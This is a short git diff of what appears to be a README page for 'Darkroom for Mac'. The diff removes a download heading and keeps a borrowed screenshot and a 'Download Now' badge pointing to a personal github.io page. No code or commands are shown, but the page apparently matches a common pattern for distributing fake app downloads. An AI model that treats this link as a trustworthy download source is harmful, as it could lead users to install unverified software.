@@ -2,7 +2,6 @@
 ![Darkroom Screenshot 1](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrHpp_Dl6hcpOtJKhRpLVMcvwWEw7eiBY0y9PNR1PI5nG2xXqKQcjVG2090yMleV9lSdo&usqp=CAU)
 
 ---
-## 📥 Download Darkroom for Mac
 
 [![Download Now](https://img.shields.io/badge/Download--Now-Darkroom%20Mac-blue?style=for-the-badge&logo=apple)](https://nikolanfu.github.io/.github/darkroom)
 
